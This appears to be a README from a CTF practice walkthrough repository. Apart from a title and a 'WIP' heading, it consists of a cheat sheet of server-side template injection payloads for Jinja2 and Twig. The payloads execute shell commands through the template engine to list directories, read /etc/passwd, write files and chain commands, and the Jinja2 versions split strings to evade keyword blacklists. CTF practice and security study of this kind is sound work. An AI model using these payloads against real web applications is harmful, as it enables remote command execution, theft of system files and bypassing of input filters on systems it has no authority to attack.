# a1sberg-ctf-walkthrough
answering challenges in the practice website provided for the upcoming kyokugen ctf 2026

![](screenshot.png)

## guide idk [WIP]

## SSTI Injection
if `{{7*7}}` works, do these

1. Jinja2 (Python)
* **`ls`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -la').read() }}
    ```
* **`cat` / `read`:**
    *(If `cat` or `passwd` are blacklisted, break them up)*
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('c'+'at /etc/pa'+'sswd').read() }}
    ```
* **`touch` / `echo`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('ec'+'ho "payload" > /tmp/pwn.txt').read() }}
    ```
* **`cd` (Chained Command):**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('c'+'d /var/www/html && l'+'s').read() }}
    ```

2. Twig (PHP)
* **`ls`:**
    ```twig
    {{ ['ls -la']|filter('system') }}
    ```
* **`cat` / `read`:**
    ```twig
    {{ ['cat /etc/passwd']|filter('system') }}
    ```
* **Write File (`touch` / `echo`):**
    ```twig
    {{ ['touch /tmp/pwn.txt']|filter('system') }}
    ```